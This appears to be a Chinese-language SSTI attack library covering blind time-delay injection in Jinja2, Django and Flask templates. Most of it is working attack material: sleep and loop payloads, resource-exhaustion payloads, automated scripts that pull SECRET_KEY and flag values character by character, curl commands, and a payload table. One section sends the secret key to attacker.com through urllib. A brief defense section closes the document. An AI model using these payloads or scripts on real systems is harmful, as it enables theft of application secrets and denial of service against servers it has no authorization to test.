# SSTI-盲注时间延迟-攻击库

## 概述

**攻击类型**：Server-Side Template Injection - 盲注时间延迟  
**影响框架**：Jinja2/Django/Flask/Twig  
**风险等级**：High  
**攻击目标**：在无回显的SSTI场景下，通过时间延迟技术验证注入并提取数据

**核心原理**：
当SSTI漏洞存在但无法直接看到输出结果时，可以通过执行耗时操作（sleep、循环、资源消耗）来判断模板代码是否成功执行，进而进行盲注数据提取。

**典型场景**：
- 模板渲染结果不直接返回给用户
- 输出被过滤或隐藏
- 异步处理的模板渲染
- 日志文件中的模板注入

---

## 核心攻击技术

### 技术1：基于sleep()的时间盲注

**原理**：
通过调用系统的sleep函数使服务器延迟响应，从而判断SSTI payload是否成功执行。

**Jinja2 Payload**：
```python
# 使用subprocess执行sleep命令
{{"".__class__.__mro__[1].__subclasses__()[396]('sleep 5',shell=True,stdout=-1).communicate()}}

# 使用time模块
{{config.__class__.__init__.__globals__['__builtins__']['__import__']('time').sleep(5)}}

# 使用os.system
{{config.__class__.__init__.__globals__['os'].system('sleep 5')}}
```

**Django模板Payload**：
```django
# Django模板较难实现sleep，通常使用循环延迟
{% load static %}
{% for i in "x"|rjust:10000000 %}{% endfor %}
```

**检测脚本**：
```python
import requests
import time

def test_ssti_time_based(url, param_name, param_value_template):
    """基于时间的SSTI检测"""
    
    # 构造延迟payload
    payloads = [
        # Jinja2 - subprocess sleep
        "{{''.__class__.__mro__[1].__subclasses__()[396]('sleep 5',shell=True,stdout=-1).communicate()}}",
        
        # Jinja2 - time.sleep
        "{{config.__class__.__init__.__globals__['__builtins__']['__import__']('time').sleep(5)}}",
        
        # Jinja2 - os.system
        "{{config.__class__.__init__.__globals__['os'].system('sleep 5')}}",
    ]
    
    for payload in payloads:
        try:
            # 记录开始时间
            start_time = time.time()
            
            # 发送payload
            data = {param_name: payload}
            r = requests.post(url, data=data, timeout=15)
            
            # 计算响应时间
            elapsed = time.time() - start_time
            
            print(f"[*] Payload: {payload[:50]}...")
            print(f"[*] 响应时间: {elapsed:.2f}秒")
            
            # 如果延迟大于4秒，说明可能存在SSTI
            if elapsed > 4:
                print(f"[+] 检测到时间延迟! 可能存在SSTI漏洞")
                print(f"[+] Payload: {payload}")
                return True
                
        except requests.Timeout:
            print(f"[!] 请求超时，可能payload导致长时间延迟")
            return True
        except Exception as e:
            print(f"[-] 错误: {e}")
    
    return False
```

---

### 技术2：条件时间盲注

**原理**：
结合条件判断和时间延迟，根据条件真假来控制是否延迟，从而实现数据提取。

**基本逻辑**：
```python
# 如果条件为真，延迟5秒
{% if condition %}{{ sleep(5) }}{% endif %}

# 如果条件为假，不延迟
{% if not condition %}{{ normal_output }}{% endif %}
```

**Jinja2条件时间盲注Payload**：
```python
# 提取config中的数据 - 逐字符盲注
# 提取第1个字符
{{config.SECRET_KEY[0]=='a' and ''.__class__.__mro__[1].__subclasses__()[396]('sleep 5',shell=True).communicate() or 'x'}}

# 提取第2个字符
{{config.SECRET_KEY[1]=='b' and ''.__class__.__mro__[1].__subclasses__()[396]('sleep 5',shell=True).communicate() or 'x'}}

# 使用ASCII码范围判断
{{config.SECRET_KEY[0]|int>64 and ''.__class__.__mro__[1].__subclasses__()[396]('sleep 5',shell=True).communicate() or 'x'}}
```

**自动化条件时间盲注脚本**：
```python
import requests
import time
import string

class SSTIBlindTimeExtractor:
    def __init__(self, url, param_name, delay=5):
        self.url = url
        self.param_name = param_name
        self.delay = delay
        self.charset = string.ascii_letters + string.digits + string.punctuation
    
    def test_condition(self, condition_payload):
        """测试条件是否为真（通过时间延迟判断）"""
        
        # 构造条件时间盲注payload
        payload = f"{{{{ {condition_payload} and ''.__class__.__mro__[1].__subclasses__()[396]('sleep {self.delay}',shell=True).communicate() or 'x' }}}}"
        
        start_time = time.time()
        
        try:
            data = {self.param_name: payload}
            r = requests.post(self.url, data=data, timeout=self.delay + 5)
            elapsed = time.time() - start_time
            
            # 如果延迟接近设定的delay时间，说明条件为真
            if elapsed > (self.delay - 1):
                return True
            else:
                return False
                
        except requests.Timeout:
            return True
        except Exception as e:
            return False
    
    def extract_char_binary_search(self, variable, position):
        """使用二分查找提取指定位置的字符"""
        
        low = 32   # ASCII可打印字符起始
        high = 126 # ASCII可打印字符结束
        
        while low <= high:
            mid = (low + high) // 2
            
            # 测试字符是否大于mid
            condition = f"{variable}[{position}]|int>{mid}"
            
            print(f"[*] 测试位置 {position}, 范围 [{low}, {high}], mid={mid}")
            
            if self.test_condition(condition):
                low = mid + 1
            else:
                high = mid - 1
        
        result_char = chr(low)
        print(f"[+] 位置 {position} 的字符: {result_char}")
        return result_char
    
    def extract_string_length(self, variable, max_length=100):
        """提取字符串长度"""
        
        for length in range(1, max_length + 1):
            # 测试长度是否等于当前值
            condition = f"{variable}|length=={length}"
            
            if self.test_condition(condition):
                print(f"[+] 字符串长度: {length}")
                return length
        
        return -1
    
    def extract_full_string(self, variable, max_length=50):
        """提取完整字符串"""
        
        print(f"[*] 开始提取变量: {variable}")
        
        # 1. 提取长度
        length = self.extract_string_length(variable, max_length)
        
        if length == -1:
            print("[-] 无法确定字符串长度")
            return None
        
        # 2. 逐字符提取
        result = ""
        for i in range(length):
            char = self.extract_char_binary_search(variable, i)
            result += char
            print(f"[*] 当前结果: {result}")
        
        print(f"\n[+] 最终结果: {result}")
        return result

# 使用示例
if __name__ == "__main__":
    extractor = SSTIBlindTimeExtractor(
        url="http://target:5000/profile",
        param_name="name",
        delay=3
    )
    
    # 提取config.SECRET_KEY
    secret_key = extractor.extract_full_string("config.SECRET_KEY", max_length=32)
```

---

### 技术3：资源消耗盲注

**原理**：
当无法使用sleep函数时，可以通过消耗大量CPU/内存资源来造成延迟。

**CPU消耗Payload**：
```python
# Jinja2 - 大量计算
{{range(10000000)|list}}

# Jinja2 - 递归循环
{% for i in range(10000000) %}{{i}}{% endfor %}

# Jinja2 - 字符串操作
{{'x'*10000000}}

# Jinja2 - 列表操作
{{[i for i in range(10000000)]}}
```

**内存消耗Payload**：
```python
# 创建大量对象
{{config.__class__.__init__.__globals__['__builtins__']['list'](range(100000000))}}

# 字符串重复
{{'a'*100000000}}
```

**利用脚本**：
```python
def test_resource_based_blind(url, param_name):
    """基于资源消耗的盲注检测"""
    
    payloads = [
        # CPU消耗
        "{{range(10000000)|list}}",
        "{{'x'*10000000}}",
        "{% for i in range(10000000) %}{{i}}{% endfor %}",
        
        # 内存消耗
        "{{[i for i in range(10000000)]}}",
    ]
    
    for payload in payloads:
        print(f"[*] 测试payload: {payload[:50]}...")
        
        start_time = time.time()
        
        try:
            data = {param_name: payload}
            r = requests.post(url, data=data, timeout=30)
            elapsed = time.time() - start_time
            
            print(f"[*] 响应时间: {elapsed:.2f}秒")
            
            # 如果响应时间超过5秒，说明资源消耗成功
            if elapsed > 5:
                print(f"[+] 检测到延迟! Payload有效")
                return True
                
        except requests.Timeout:
            print(f"[!] 请求超时，资源消耗过大")
            return True
        except Exception as e:
            print(f"[-] 错误: {e}")
    
    return False
```

---

### 技术4：循环延迟盲注

**原理**：
通过在模板中执行大量循环操作来造成延迟，适用于无法直接调用sleep的环境。

**Jinja2循环延迟**：
```jinja2
<!-- 基本循环延迟 -->
{% for i in range(10000000) %}{% endfor %}

<!-- 嵌套循环延迟 -->
{% for i in range(1000) %}
  {% for j in range(10000) %}
  {% endfor %}
{% endfor %}

<!-- 条件循环延迟 -->
{% if config.SECRET_KEY[0]=='a' %}
  {% for i in range(10000000) %}{% endfor %}
{% endif %}
```

**条件循环盲注Payload**：
```python
# 如果第一个字符是'a'，执行1000万次循环
{% if config.SECRET_KEY[0]=='a' %}{% for i in range(10000000) %}{% endfor %}{% endif %}

# 如果密钥长度大于10，执行循环延迟
{% if config.SECRET_KEY|length>10 %}{% for i in range(10000000) %}{% endfor %}{% endif %}
```

**自动化循环盲注脚本**：
```python
def extract_with_loop_delay(url, param_name, variable, position):
    """使用循环延迟进行字符提取"""
    
    charset = string.ascii_letters + string.digits + '_-'
    
    for char in charset:
        # 构造条件循环延迟payload
        payload = f"{{% if {variable}[{position}]=='{char}' %}}{{% for i in range(10000000) %}}{{% endfor %}}{{% endif %}}"
        
        start_time = time.time()
        
        try:
            data = {param_name: payload}
            r = requests.post(url, data=data, timeout=15)
            elapsed = time.time() - start_time
            
            # 如果延迟超过3秒，说明条件为真
            if elapsed > 3:
                print(f"[+] 位置 {position} 的字符: {char}")
                return char
                
        except requests.Timeout:
            print(f"[+] 位置 {position} 的字符: {char} (超时)")
            return char
        except Exception as e:
            continue
    
    return None
```

---

### 技术5：Django模板盲注

**原理**：
Django模板语言限制较多，无法直接执行Python代码，需要使用特殊技巧实现时间盲注。

**Django循环延迟技巧**：
```django
<!-- 使用rjust过滤器创建大字符串 -->
{% for i in "x"|rjust:10000000 %}{% endfor %}

<!-- 使用ljust过滤器 -->
{% for i in "x"|ljust:10000000 %}{% endfor %}

<!-- 使用center过滤器 -->
{% for i in "x"|center:10000000 %}{% endfor %}
```

**Django条件循环盲注**：
```django
<!-- 提取settings中的数据 -->
{% if settings.SECRET_KEY.0 == 'a' %}
  {% for i in "x"|rjust:10000000 %}{% endfor %}
{% endif %}

<!-- 判断长度 -->
{% if settings.SECRET_KEY|length > 20 %}
  {% for i in "x"|rjust:10000000 %}{% endfor %}
{% endif %}
```

**Django盲注利用脚本**：
```python
def django_blind_time_exploit(url, param_name):
    """Django模板时间盲注"""
    
    def test_char(variable, position, char):
        """测试指定位置的字符"""
        
        # 构造Django条件循环延迟payload
        payload = f"{{% if {variable}.{position} == '{char}' %}}{{% for i in 'x'|rjust:10000000 %}}{{% endfor %}}{{% endif %}}"
        
        start_time = time.time()
        
        try:
            data = {param_name: payload}
            r = requests.post(url, data=data, timeout=15)
            elapsed = time.time() - start_time
            
            return elapsed > 3
            
        except requests.Timeout:
            return True
        except Exception:
            return False
    
    # 提取settings.SECRET_KEY
    result = ""
    for pos in range(50):
        for char in string.ascii_letters + string.digits + '_-':
            if test_char('settings.SECRET_KEY', pos, char):
                result += char
                print(f"[+] 当前结果: {result}")
                break
        else:
            break
    
    print(f"\n[+] 最终结果: {result}")
    return result
```

---

### 技术6：文件操作延迟盲注

**原理**：
通过读取大文件或执行慢速文件操作来造成延迟。

**Payload示例**：
```python
# 读取大文件造成延迟
{{config.__class__.__init__.__globals__['__builtins__']['open']('/dev/urandom').read(10000000)}}

# 打开大量文件
{% for i in range(1000) %}
  {{config.__class__.__init__.__globals__['__builtins__']['open']('/etc/passwd')}}
{% endfor %}
```

---

### 技术7：网络请求延迟盲注

**原理**：
通过向慢速服务器发起请求来造成延迟。

**Payload示例**：
```python
# 使用urllib访问慢速服务器
{{config.__class__.__init__.__globals__['__builtins__']['__import__']('urllib.request').urlopen('http://slow-server.com/delay?time=5')}}

# 条件网络请求
{% if config.SECRET_KEY[0]=='a' %}
  {{config.__class__.__init__.__globals__['__builtins__']['__import__']('urllib.request').urlopen('http://attacker.com/?char=a')}}
{% endif %}
```

**利用脚本**：
```python
def network_based_blind_exfil(url, param_name, attacker_server):
    """基于网络请求的数据外带"""
    
    # 构造payload - 将数据通过HTTP请求外带
    payload = f"""
    {{{{config.__class__.__init__.__globals__['__builtins__']['__import__']('urllib.request').urlopen('http://{attacker_server}/?data=' + config.SECRET_KEY)}}}}
    """
    
    # 发送payload
    data = {param_name: payload}
    requests.post(url, data=data)
    
    # 在attacker_server的日志中查看外带的数据
    print(f"[*] 检查 {attacker_server} 的访问日志获取外带数据")
```

---

## 完整自动化利用工具

```python
#!/usr/bin/env python3
"""
SSTI盲注时间延迟完整利用工具
"""
import requests
import time
import string
import sys
from concurrent.futures import ThreadPoolExecutor

class SSTIBlindTimeExploit:
    def __init__(self, url, param_name='name', param_method='POST', delay=5):
        self.url = url
        self.param_name = param_name
        self.param_method = param_method.upper()
        self.delay = delay
        self.charset = string.ascii_letters + string.digits + string.punctuation
        self.session = requests.Session()
    
    def send_payload(self, payload, timeout=None):
        """发送payload并返回响应时间"""
        if timeout is None:
            timeout = self.delay + 10
        
        start_time = time.time()
        
        try:
            if self.param_method == 'POST':
                data = {self.param_name: payload}
                r = self.session.post(self.url, data=data, timeout=timeout)
            else:
                params = {self.param_name: payload}
                r = self.session.get(self.url, params=params, timeout=timeout)
            
            elapsed = time.time() - start_time
            return elapsed, r
            
        except requests.Timeout:
            elapsed = time.time() - start_time
            return elapsed, None
        except Exception as e:
            return 0, None
    
    def test_basic_time_injection(self):
        """测试基本时间注入"""
        print("[*] 测试基本时间注入...")
        
        payloads = [
            # Jinja2 subprocess sleep
            f"{{{{''.__class__.__mro__[1].__subclasses__()[396]('sleep {self.delay}',shell=True,stdout=-1).communicate()}}}}",
            
            # Jinja2 time.sleep
            f"{{{{config.__class__.__init__.__globals__['__builtins__']['__import__']('time').sleep({self.delay})}}}}",
            
            # Jinja2 os.system
            f"{{{{config.__class__.__init__.__globals__['os'].system('sleep {self.delay}')}}}}",
            
            # 循环延迟
            "{{% for i in range(10000000) %}}{{% endfor %}}",
            
            # 资源消耗
            "{{range(10000000)|list}}",
        ]
        
        for i, payload in enumerate(payloads, 1):
            print(f"\n[{i}] 测试payload: {payload[:60]}...")
            
            elapsed, r = self.send_payload(payload)
            print(f"[*] 响应时间: {elapsed:.2f}秒")
            
            if elapsed > (self.delay - 1):
                print(f"[+] 检测到时间延迟! SSTI漏洞存在")
                print(f"[+] 有效payload: {payload}")
                return payload
        
        print("[-] 未检测到时间延迟")
        return None
    
    def test_condition(self, condition):
        """测试条件是否为真"""
        
        # 构造条件时间盲注payload
        payload = f"{{{{ {condition} and ''.__class__.__mro__[1].__subclasses__()[396]('sleep {self.delay}',shell=True).communicate() or 'x' }}}}"
        
        elapsed, r = self.send_payload(payload)
        
        # 如果延迟接近设定时间，说明条件为真
        return elapsed > (self.delay - 1)
    
    def extract_length(self, variable, max_length=100):
        """提取变量长度"""
        print(f"[*] 提取 {variable} 的长度...")
        
        # 二分查找长度
        low = 0
        high = max_length
        
        while low < high:
            mid = (low + high + 1) // 2
            condition = f"{variable}|length>={mid}"
            
            print(f"[*] 测试长度 >= {mid}...")
            
            if self.test_condition(condition):
                low = mid
            else:
                high = mid - 1
        
        print(f"[+] 长度: {low}")
        return low
    
    def extract_char_binary(self, variable, position):
        """使用二分查找提取字符"""
        low = 32
        high = 126
        
        while low < high:
            mid = (low + high + 1) // 2
            
            # 测试ASCII值是否>=mid
            condition = f"({variable}[{position}]|int)>={mid}"
            
            if self.test_condition(condition):
                low = mid
            else:
                high = mid - 1
        
        return chr(low) if low >= 32 else None
    
    def extract_char_direct(self, variable, position):
        """直接遍历字符集提取字符（更快但更多请求）"""
        for char in self.charset:
            # 需要转义特殊字符
            escaped_char = char.replace("'", "\\'")
            condition = f"{variable}[{position}]=='{escaped_char}'"
            
            if self.test_condition(condition):
                return char
        
        return None
    
    def extract_string(self, variable, max_length=50, method='binary'):
        """提取完整字符串"""
        print(f"\n[*] 开始提取: {variable}")
        
        # 1. 提取长度
        length = self.extract_length(variable, max_length)
        
        if length == 0:
            print("[-] 变量为空或不存在")
            return None
        
        # 2. 逐字符提取
        result = ""
        for i in range(length):
            print(f"\n[*] 提取位置 {i}...")
            
            if method == 'binary':
                char = self.extract_char_binary(variable, i)
            else:
                char = self.extract_char_direct(variable, i)
            
            if char:
                result += char
                print(f"[+] 位置 {i}: '{char}' | 当前结果: {result}")
            else:
                print(f"[-] 位置 {i}: 无法提取")
                break
        
        print(f"\n[+] 最终结果: {result}")
        return result
    
    def extract_parallel(self, variable, length):
        """并行提取字符（更快）"""
        print(f"[*] 使用并行模式提取 {length} 个字符...")
        
        result = [''] * length
        
        def extract_position(pos):
            char = self.extract_char_binary(variable, pos)
            return pos, char
        
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(extract_position, i) for i in range(length)]
            
            for future in futures:
                pos, char = future.result()
                if char:
                    result[pos] = char
                    print(f"[+] 位置 {pos}: '{char}'")
        
        final_result = ''.join(result)
        print(f"\n[+] 最终结果: {final_result}")
        return final_result
    
    def full_exploit(self, login_data=None):
        """完整利用流程"""
        print("="*60)
        print("SSTI盲注时间延迟利用工具")
        print("="*60 + "\n")
        
        print(f"[*] 目标: {self.url}")
        print(f"[*] 参数: {self.param_name}")
        print(f"[*] 方法: {self.param_method}")
        print(f"[*] 延迟: {self.delay}秒\n")
        
        # 1. 登录（如果需要）
        if login_data:
            print("[*] 执行登录...")
            self.session.post(self.url.replace('/profile', '/login'), 
                            data=login_data)
            print("[+] 登录完成\n")
        
        # 2. 测试基本时间注入
        valid_payload = self.test_basic_time_injection()
        
        if not valid_payload:
            print("\n[-] 未检测到SSTI时间盲注漏洞")
            return None
        
        # 3. 提取敏感数据
        print("\n" + "="*60)
        print("开始数据提取")
        print("="*60 + "\n")
        
        # 提取config.SECRET_KEY
        secret_key = self.extract_string('config.SECRET_KEY', max_length=50)
        
        return secret_key

# 命令行使用
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <目标URL> [参数名] [延迟秒数]")
        print(f"例如: {sys.argv[0]} http://target:5000/profile name 3")
        sys.exit(1)
    
    url = sys.argv[1]
    param_name = sys.argv[2] if len(sys.argv) > 2 else 'name'
    delay = int(sys.argv[3]) if len(sys.argv) > 3 else 5
    
    exploit = SSTIBlindTimeExploit(url, param_name, delay=delay)
    
    # 如果需要登录
    login_data = {
        'username': 'test',
        'password': 'test'
    }
    
    result = exploit.full_exploit(login_data=login_data)
```

---

## 实战场景

### 场景1：Flask注册系统盲SSTI

**应用背景**：
Django艺术画廊注册系统，用户name字段存在SSTI，但渲染结果不直接显示。

**漏洞代码**：
```python
def register_step3(request):
    name = request.session['name']
    
    template_str = open('register_step3.html').read()
    template = engine.from_string(template_str.replace('ACCOUNTNAME', name))
    
    # 渲染结果不返回给用户，仅记录日志
    result = template.render({'flag': flag}, request)
    log.write(result)
    
    return HttpResponse("注册成功")
```

**利用步骤**：
```python
import requests
import time

session = requests.Session()

# Step 1: 注入时间延迟payload到name
payload = "{% if 1 %}{% for i in 'x'|rjust:10000000 %}{% endfor %}{% endif %}"

r = session.post('http://target:8000/register/step1/', data={
    'name': payload,
    'password': 'test'
})

# 测试响应时间
start = time.time()
r = session.post('http://target:8000/register/step2/', data={'email': 'a@a.com'})
r = session.get('http://target:8000/register/step3/')
elapsed = time.time() - start

if elapsed > 3:
    print(f"[+] 时间盲注成功! 延迟: {elapsed:.2f}秒")
```

---

### 场景2：条件时间盲注提取FLAG

**攻击目标**：
提取Django模板上下文中的flag变量。

**利用脚本**：
```python
import requests
import time
import string

def extract_flag_blind(url):
    session = requests.Session()
    flag = "flag{"
    
    # 已知flag格式: flag{...}
    # 逐字符提取
    
    for pos in range(5, 50):  # 从第6个字符开始
        found = False
        
        for char in string.ascii_letters + string.digits + '_-}':
            # 构造条件延迟payload
            payload = f"{{% if flag.{pos} == '{char}' %}}{{% for i in 'x'|rjust:10000000 %}}{{% endfor %}}{{% endif %}}"
            
            start = time.time()
            
            # Step1-3的完整流程
            session.post(f'{url}/register/step1/', data={
                'name': payload,
                'password': 'test'
            })
            session.post(f'{url}/register/step2/', data={'email': 'a@a.com'})
            session.get(f'{url}/register/step3/')
            
            elapsed = time.time() - start
            
            if elapsed > 3:
                flag += char
                print(f"[+] 当前FLAG: {flag}")
                found = True
                
                if char == '}':
                    print(f"\n[+] 完整FLAG: {flag}")
                    return flag
                break
        
        if not found:
            break
    
    return flag

# 使用
flag = extract_flag_blind('http://target:8000')
```

---

### 场景3：Jinja2盲注提取SECRET_KEY

**利用脚本**：
```python
from SSTIBlindTimeExploit import SSTIBlindTimeExploit

exploit = SSTIBlindTimeExploit(
    url='http://target:5000/amortization',
    param_name='term',
    delay=3
)

# 提取SECRET_KEY
secret = exploit.extract_string('config.SECRET_KEY', max_length=32, method='binary')

print(f"[+] SECRET_KEY: {secret}")
```

---

## 手动测试命令

```bash
# 1. 测试基本时间延迟
curl -X POST http://target:5000/profile \
  -d "name={{config.__class__.__init__.__globals__['os'].system('sleep 5')}}" \
  -w "\n响应时间: %{time_total}秒\n"

# 2. 条件时间盲注
curl -X POST http://target:5000/profile \
  -d "name={{config.SECRET_KEY[0]=='a' and ''.__class__.__mro__[1].__subclasses__()[396]('sleep 5',shell=True).communicate() or 'x'}}" \
  -w "\n响应时间: %{time_total}秒\n"

# 3. 循环延迟测试
curl -X POST http://target:5000/profile \
  -d "name={% for i in range(10000000) %}{% endfor %}" \
  -w "\n响应时间: %{time_total}秒\n"
```

---

## Payload速查表

| 攻击类型 | Payload示例 | 延迟时间 |
|---------|------------|---------|
| subprocess sleep | `{{''.__class__.__mro__[1].__subclasses__()[396]('sleep 5',shell=True).communicate()}}` | 5秒 |
| time.sleep | `{{config.__class__.__init__.__globals__['__builtins__']['__import__']('time').sleep(5)}}` | 5秒 |
| 循环延迟 | `{% for i in range(10000000) %}{% endfor %}` | ~3-5秒 |
| Django循环 | `{% for i in "x"\|rjust:10000000 %}{% endfor %}` | ~5秒 |
| 条件延迟 | `{{condition and sleep(5) or 'x'}}` | 0或5秒 |

---

## 防御措施

### 1. 输入验证和过滤
```python
import re

def sanitize_template_input(user_input):
    # 禁止模板语法字符
    forbidden_chars = ['{', '}', '%', '|', '_']
    
    for char in forbidden_chars:
        if char in user_input:
            raise ValueError("Invalid input")
    
    return user_input
```

### 2. 使用安全的模板渲染
```python
# 不要使用render_template_string
# return render_template_string(user_input)

# 使用预定义模板
return render_template('safe_template.html', user_data=user_input)
```

### 3. 超时限制
```python
import signal

def timeout_handler(signum, frame):
    raise TimeoutError("Template rendering timeout")

signal.signal(signal.SIGALRM, timeout_handler)
signal.alarm(2)  # 2秒超时

try:
    result = render_template_string(template)
finally:
    signal.alarm(0)
```

---

## 总结

**SSTI盲注时间延迟攻击要点**：
1. ✅ 使用sleep/循环/资源消耗造成延迟
2. ✅ 结合条件判断实现数据提取
3. ✅ 二分查找优化字符提取效率
4. ✅ Django使用rjust/ljust过滤器实现延迟
5. ✅ 防御关键：输入过滤+渲染超时+禁用render_template_string

盲注时间延迟是SSTI漏洞利用的高级技术，适用于无回显场景，但提取数据耗时较长。
